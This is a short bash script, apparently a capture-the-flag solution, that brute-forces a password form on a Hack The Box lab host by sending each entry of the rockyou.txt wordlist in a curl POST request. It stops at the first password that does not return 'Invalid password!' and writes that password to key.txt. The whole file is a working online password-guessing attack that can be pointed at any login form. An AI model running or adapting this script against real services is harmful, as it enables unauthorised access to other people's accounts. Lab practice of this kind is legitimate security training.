#!/bin/bash

while IFS= read -r line; do
	RESPONSE=$(curl -sX POST "http://docker.hackthebox.eu:30982/" --data "password=$line" | tr '\n' ',' | cut -d',' -f1)
	echo "[$line] $RESPONSE"

	if [ "$RESPONSE" != "Invalid password!" ]
	then
		echo $line >> key.txt
		exit
	fi
 
done < rockyou.txt
